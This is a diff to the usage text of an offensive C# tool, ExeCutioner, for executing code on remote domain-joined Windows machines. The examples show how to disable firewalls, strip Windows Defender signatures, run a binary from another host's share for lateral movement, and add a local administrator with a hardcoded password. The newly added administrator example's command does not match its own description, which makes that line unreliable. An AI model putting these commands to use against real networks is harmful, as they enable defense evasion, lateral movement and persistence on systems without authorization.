@@ -349,7 +349,7 @@ Executes code on Remote Domain Joined machines
             Console.WriteLine("//Authenticate to target with username and password and disable firewall profiles");
             Console.WriteLine("ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /domain <domain> /nofw true\n");
 
-            Console.WriteLine("//Authenticate to target with current system token and turn off av");
+            Console.WriteLine("//Authenticate to target with current system token and remove Windows Defender Signature Definitions");
             Console.WriteLine("ExeCutioner.exe /t <target name or IP> /syscreds true /nofw true\n");
 
             Console.WriteLine("//Authenticate to target with current system token and execute command");
@@ -357,6 +357,9 @@ Executes code on Remote Domain Joined machines
 
             Console.WriteLine("//Authenticate to target with current system token and execute binary for lateral movement");
             Console.WriteLine("ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>\n");
+            
+            Console.WriteLine("//Authenticate to target with current user token and add a new Local Administrator - username: newguy and password: MakeLife123");
+            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>");
 
             return;
         }
